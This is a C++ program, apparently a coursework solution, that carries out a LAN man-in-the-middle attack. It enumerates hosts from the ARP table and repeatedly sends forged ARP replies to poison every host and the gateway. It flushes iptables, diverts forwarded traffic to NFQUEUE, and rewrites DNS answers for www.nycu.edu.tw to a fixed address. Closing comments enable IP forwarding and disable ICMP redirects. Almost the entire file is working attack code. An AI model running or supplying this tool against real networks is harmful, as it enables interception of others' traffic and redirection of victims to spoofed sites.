#include <iostream>
#include <cstring>
#include <map>
#include <unordered_map>
#include <iomanip>
#include <string>
#include <algorithm>
#include <fstream>
#include <cstdio>
#include <vector>
#include <memory>
#include <stdexcept>
#include <array>
#include <time.h>
#include <math.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netdb.h>
#include <thread>
#include <pthread.h>
#include <chrono>
#include <linux/if_packet.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <errno.h>
#include <linux/types.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>

using namespace std;

struct ownaddr {
    string ip;
    string mac;
};

/* DNS header definition */
struct dnshdr {
    u_int16_t id;
    u_int16_t flags;
    u_int16_t qdcount;
    u_int16_t ancount;
    u_int16_t nscount;
    u_int16_t arcount;
};

/* DNS query structure */
struct dnsquery {
    u_int16_t qtype;
    u_int16_t qclass;
};

/* DNS answer structure */
struct dnsanswers {
    u_int16_t start_off;
    u_int16_t atype;
    u_int16_t aclass;
    u_int16_t ttl_one;
    u_int16_t ttl_two;
    u_int16_t RdataLen;
};

unordered_map<string, string> seen_addresses;
string dev_name = "";
ownaddr own;
ownaddr gw;

string execCommand(const char* cmd) {
    array<char, 128> buffer;
    string result;
    shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) 
        throw runtime_error("popen() failed!");

    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) 
            result += buffer.data();
    }
    return result;
}

string subnet(string ip_add) {
    string ret = "";
    int dot = 0;
    for(int i = 0; i < int(ip_add.size()) && dot < 3; i++){
        if(ip_add[i] == '.') dot++;
        ret += ip_add[i];
    }
    return ret;
}

void get_defaultgw() {
    FILE *f;
    char line[100] , *p , *c, *g, *saveptr;
    f = fopen("/proc/net/route", "r");

    while(fgets(line , 100 , f)) {
        p = strtok_r(line, " \t", &saveptr);
        c = strtok_r(NULL, " \t", &saveptr);
        g = strtok_r(NULL, " \t", &saveptr);

        if(p != NULL && c != NULL) {
            if(strcmp(c, "00000000") == 0) {
                if(g) {
                    char *pEnd;
                    int ng = strtol(g, &pEnd,16);
                    struct in_addr addr;
                    addr.s_addr = ng;
                    gw.ip = string(inet_ntoa(addr));
                    dev_name = string(p);
                }
                break;
            }
        }
    }
    fclose(f);
    return;
}

void get_interface_info() {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev_name.c_str(), IFNAMSIZ);

    ioctl(fd, SIOCGIFADDR, &ifr);
    struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
    own.ip = inet_ntoa(addr->sin_addr);

    ioctl(fd, SIOCGIFHWADDR, &ifr);
    char mac_address_str[18];
    sprintf(mac_address_str, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char) ifr.ifr_hwaddr.sa_data[0], (unsigned char) ifr.ifr_hwaddr.sa_data[1], (unsigned char) ifr.ifr_hwaddr.sa_data[2], (unsigned char) ifr.ifr_hwaddr.sa_data[3], (unsigned char) ifr.ifr_hwaddr.sa_data[4], (unsigned char) ifr.ifr_hwaddr.sa_data[5]);
    own.mac = string(mac_address_str);

    close(fd);
    return;
}

void read_arp_table() {
    FILE* arp_file = fopen("/proc/net/arp", "r");

    char line[256];
    fgets(line, sizeof(line), arp_file);

    while (fgets(line, sizeof(line), arp_file)) {
        char ip_str[16], hw_type[6], flags[6], mac_str[18], mask_str[6], device[500];
        int n = sscanf(line, "%s 0x%s 0x%s %17s %s %s", ip_str, hw_type, flags, mac_str, mask_str, device);
        if (n == 6) {
            string ip_address(ip_str);
            string mac_address(mac_str);

            if(ip_address == gw.ip) 
                gw.mac = mac_address;
            if (ip_address != own.ip && ip_address != gw.ip && subnet(ip_address) == subnet(own.ip)) 
                seen_addresses[ip_address] = mac_address;
        }
    }

    fclose(arp_file);
}

void task1() {
    get_defaultgw();
    get_interface_info();
    read_arp_table();

    cout << "Available devices\n------------------------------------\nIP                 MAC\n";
    cout << "------------------------------------\n";
    for (auto it = seen_addresses.begin(); it != seen_addresses.end(); it++){
        if(it->second != "00:00:00:00:00:00")
            cout << left << setw(15) << it->first << "    " << it->second << '\n';
    }
}

void send_arp_reply(const char* src_ip, const char* src_mac, const char* dest_ip, const char* dest_mac, const char* interface) {
    int raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (raw_socket < 0) {
        perror("Socket creation failed");
        return;
    }

    uint32_t src_ip_binary = inet_addr(src_ip);
    uint32_t dst_ip_binary = inet_addr(dest_ip);
    unsigned int srcmac[6], dstmac[6];
    sscanf(src_mac,  "%x:%x:%x:%x:%x:%x", &srcmac[0], &srcmac[1], &srcmac[2], &srcmac[3], &srcmac[4], &srcmac[5]);
    sscanf(dest_mac, "%x:%x:%x:%x:%x:%x", &dstmac[0], &dstmac[1], &dstmac[2], &dstmac[3], &dstmac[4], &dstmac[5]);

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(struct sockaddr_ll));

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(struct ifreq));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    if (ioctl(raw_socket, SIOCGIFINDEX, &ifr) == -1) {
        perror("Failed to get interface index");
        close(raw_socket);
        return;
    }

    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = ifr.ifr_ifindex;
    sa.sll_addr[6] = 0;
    sa.sll_addr[7] = 0;
    for(int i = 0; i < 6; i++)
        sa.sll_addr[i] = dstmac[i];

    unsigned char packet[42];
    memset(packet, '\0', sizeof(packet));

    for(int i = 0; i < 6; i++) packet[i]     = dstmac[i];
    for(int i = 0; i < 6; i++) packet[6 + i] = srcmac[i];
    memcpy(packet + 12, &sa.sll_protocol, 2); // Protocol

    // ARP header
    packet[14] = 0x00; // Hardware type: Ethernet
    packet[15] = 0x01;
    packet[16] = 0x08; // Protocol type: IPv4
    packet[17] = 0x00;
    packet[18] = 0x06; // Hardware size: 6 bytes
    packet[19] = 0x04; // Protocol size: 4 bytes
    packet[20] = 0x00; // Opcode: ARP reply
    packet[21] = 0x02;

    for(int i = 0; i < 6; i++) packet[32 + i] = dstmac[i];
    for(int i = 0; i < 6; i++) packet[22 + i] = srcmac[i];

    memcpy(packet + 28, &src_ip_binary, 4);
    memcpy(packet + 38, &dst_ip_binary, 4);

    if (sendto(raw_socket, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(struct sockaddr_ll)) == -1) {
        perror("Failed to send ARP reply");
    }

    close(raw_socket);
}

void* task2(void* arg){
    while(true){
        for (auto it = seen_addresses.begin(); it != seen_addresses.end(); it++){
            send_arp_reply(gw.ip.c_str(), own.mac.c_str(), it->first.c_str(), it->second.c_str(), dev_name.c_str());
            send_arp_reply(it->first.c_str(), own.mac.c_str(), gw.ip.c_str(), gw.mac.c_str(),  dev_name.c_str());
        }
        sleep(3);
    }
}

u_int16_t computeIPChecksum(struct iphdr* iphdr) {
    unsigned long sum = 0;
    u_int16_t* ptr = (u_int16_t*)iphdr;
    int hdr_len = iphdr->ihl * 4;

    while (hdr_len > 1) {
        sum += *ptr++;
        hdr_len -= 2;
    }

    if (hdr_len == 1) {
        sum += *((u_int8_t*)ptr);
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    return (u_int16_t)(~sum);
}

uint16_t calculate_udp_checksum(const uint8_t *buf, size_t len, uint32_t src_ip, uint32_t dest_ip) {
    uint32_t sum = 0;
    
    // Pseudo-header
    sum += (src_ip >> 16) & 0xFFFF;  // Source IP High 16 bits
    sum += src_ip & 0xFFFF;          // Source IP Low 16 bits
    sum += (dest_ip >> 16) & 0xFFFF; // Destination IP High 16 bits
    sum += dest_ip & 0xFFFF;         // Destination IP Low 16 bits
    sum += htons(IPPROTO_UDP);       // Protocol
    sum += htons(len);               // UDP Length
    
    // UDP header and payload
    const uint16_t *buf16 = reinterpret_cast<const uint16_t *>(buf);
    while (len > 1) {
        sum += *buf16++;
        len -= 2;
    }
    // If there's a single byte left over, add it to the sum (padding)
    if (len) {
        sum += *reinterpret_cast<const uint8_t *>(buf16);
    }
    
    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    // Take one's complement of the sum
    return ~sum;
}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *buf) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw  *hwph;
    u_int32_t id = 0, plen = 0;
    unsigned char *data;

    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
        // printf("hw_protocol=0x%04x hook=%u id=%u ", ntohs(ph->hw_protocol), ph->hook, id);
    }

    plen = nfq_get_payload(nfa, &data);
    // if (plen >= 0) printf("payload_len=%d\n", plen);

    // for (int i = 0; i < plen; i++) {
    //     printf("%0X ", data[i]);
    //     if ((i + 1) % 16 == 0) cout << endl;
    // }
    struct iphdr*  iphdr   = (struct iphdr*)(data);
    // TCP : 6, UDP : 17
    // cout << "Protocol: " << int(iphdr->protocol) << '\n';
    if(int(iphdr->protocol) != 17)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    struct udphdr* udp_hdr = (struct udphdr*)(data + iphdr->ihl*4);
    u_int16_t srcport = ntohs(udp_hdr->source);
    u_int16_t udp_len = ntohs(udp_hdr->len);

    char iparr[INET_ADDRSTRLEN];
    struct in_addr ip_str;
    ip_str.s_addr = iphdr->saddr;
    inet_ntop(AF_INET, &ip_str, iparr, INET_ADDRSTRLEN);
    string srcipaddr = string(iparr);

    if(seen_addresses.count(srcipaddr) || srcport != 53)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);

    // cout << "IP Header:" << endl;
    // cout << "  Source IP     : " << inet_ntoa(*(struct in_addr*)&(iphdr->saddr)) << endl;
    // cout << "  Destination IP: " << inet_ntoa(*(struct in_addr*)&(iphdr->daddr)) << endl;
    // cout << "  src port : " << srcport << '\n';

    // --------- start dns parsing -----------------

    struct dnshdr* dns_hdr = (struct dnshdr*)(data + iphdr->ihl*4 + sizeof(udphdr));
    u_int16_t que_num  = ntohs(dns_hdr->qdcount);
    u_int16_t ans_num  = ntohs(dns_hdr->ancount);
    u_int16_t auth_num = ntohs(dns_hdr->nscount);
    u_int16_t add_num  = ntohs(dns_hdr->arcount);
    int data_copy[plen], index = 0;
    for (int i = iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr); i < plen; i++) {
        data_copy[index] = int(data[i]);
        // printf("%02X ", data[i]);
        index++;
    }
    // cout << '\n';
    data_copy[index] = '\0';
    int que_len = 0;

    // --------- finish dns header -----------------
    u_int16_t ans_type;
    u_int16_t ans_class;
    string dnshostname = "";
    struct dnsquery* dns_qry;
    for(int z = 0; z < que_num; z++){
        dnshostname = "";
        // cout << "DNS Query " << z+1 << " :" << endl;
        int sz = data_copy[que_len], j = 0, i = 1;
        while(sz > 0){
            for(int k = 0; k < sz; k++)
                dnshostname += char(data_copy[i + k]);
            dnshostname += '.';
            i += sz;
            sz = data_copy[i++];
        }
        if (!dnshostname.empty() && dnshostname.back() == '.') dnshostname.pop_back();
        que_len += (dnshostname.length() + 2);

        dns_qry = (struct dnsquery*)(data + iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr) + que_len);
        ans_type  = ntohs(dns_qry->qtype);
        ans_class = ntohs(dns_qry->qclass);
        // printf("  Type : 0x%04X\n", ans_type);
        // printf("  Class: 0x%04X\n", ans_class);
        
        que_len += sizeof(dnsquery);
    }

    if(dnshostname != "www.nycu.edu.tw")
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    if(ans_type != 1)
        return nfq_set_verdict(qh, id, NF_DROP , 0, NULL);

    // cout << "DNS server answer : " << dnshostname << '\n';
    // for (int i = iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr) + que_len; i < plen; i++)
    //     printf("%02X ", data[i]);
    // cout << "\n\n";

    // --------- finish dns query -----------------
    bool modify_p = false;

    int ans_len = 0;
    struct dnsanswers* dns_ans;
    struct dnsanswers store_dns;
    store_dns.atype    = htons(1);
    store_dns.aclass   = htons(1);
    store_dns.ttl_one  = htons(0);
    store_dns.ttl_two  = htons(5);
    store_dns.RdataLen = htons(4);
    for(int z = 0; z < ans_num; z++){
        dns_ans = (struct dnsanswers*)(data + iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr) + que_len + ans_len);
        ans_len += sizeof(dnsanswers);
        if(z == 0)
            store_dns.start_off = htons(ntohs(dns_ans->start_off));

        // printf("  start_off : 0x%04X\n", ntohs(dns_ans->start_off));
        // printf("  atype     : 0x%04X\n", ntohs(dns_ans->atype));
        // printf("  aclass    : 0x%04X\n", ntohs(dns_ans->aclass));
        // printf("  ttl       : 0x%04X %04X\n", ntohs(dns_ans->ttl_one), ntohs(dns_ans->ttl_two));
        // printf("  RdataLen  : 0x%04X\n", ntohs(dns_ans->RdataLen));
        if(ans_type == 1){
            modify_p = true;
        }
        ans_len += ntohs(dns_ans->RdataLen);
    }

    // --------- finish dns answer -----------------
    // cout << "\n===========================\n\n";
    // ip : 20  tot_len : 3,4, cksum : 11,12
    // udp: 8   len: 5,6
    // dns: 12

    unsigned char answer_data[] = {140, 113, 24, 241};
    if(!modify_p)
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    else {
        iphdr->tot_len = htons(iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr) + que_len + 4 + sizeof(dnsanswers));
        udp_hdr->len   = htons(sizeof(udphdr) + sizeof(dnshdr) + que_len + 4 + sizeof(dnsanswers));
        udp_hdr->check = 0;
        dns_hdr->qdcount = htons(1);
        dns_hdr->ancount = htons(1);
        dns_hdr->nscount = htons(0);
        dns_hdr->arcount = htons(0);
        int new_packet_len = iphdr->ihl*4 + sizeof(udphdr) + sizeof(dnshdr) + que_len + 4 + sizeof(dnsanswers);
        unsigned char* new_packet_data = new unsigned char[new_packet_len];
        memcpy(new_packet_data, data, new_packet_len - 4 - sizeof(dnsanswers));
        memcpy(new_packet_data + new_packet_len - 4 - sizeof(dnsanswers), &store_dns, sizeof(dnsanswers));
        memcpy(new_packet_data + new_packet_len - 4, answer_data, sizeof(answer_data));
        struct iphdr* newiphdr = (struct iphdr*)(new_packet_data);
        newiphdr->check = 0;
        struct udphdr* tmp_udp = (struct udphdr*)(new_packet_data + newiphdr -> ihl * 4);
        tmp_udp->check  = calculate_udp_checksum((const uint8_t*)tmp_udp, new_packet_len - newiphdr -> ihl * 4, newiphdr -> saddr, newiphdr -> daddr);
        newiphdr->check = computeIPChecksum(newiphdr);

        return nfq_set_verdict(qh, id, NF_ACCEPT, new_packet_len, new_packet_data);
    }
}

static void* nfque(void* args) {
    string clean_iptable = execCommand("iptables --flush");
    string set_iptable1  = execCommand("iptables -A FORWARD -j NFQUEUE --queue-num 0");

    struct nfq_handle *h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }

    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }

    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }

    struct nfq_q_handle *qh = nfq_create_queue(h,  0, &cb, NULL);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }

    int fd = nfq_fd(h), rv;

    char buf[4096];
    while (1) {
        if ((rv = recv(fd, buf, sizeof(buf), 0)) >= 0) {
            nfq_handle_packet(h, buf, rv);
            continue;
        }
        else if (rv < 0 && errno == ENOBUFS) {
            printf("losing packets!\n");
            continue;
        }
        perror("recv failed");
        break;
    }

    nfq_destroy_queue(qh);
    nfq_close(h);

    return NULL;
}

int main() {
    task1();
    pthread_t t1;
    pthread_t t2;
    void* args = NULL;
    if (pthread_create(&t1, NULL, task2, args) != 0) {
        perror("pthread_create");
        exit(-1);
    }
    if (pthread_create(&t2, NULL, nfque, args) != 0) {
        perror("pthread_create");
        exit(-1);
    }

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    
    return 0;
}

// echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
// echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
// -lnetfilter_queue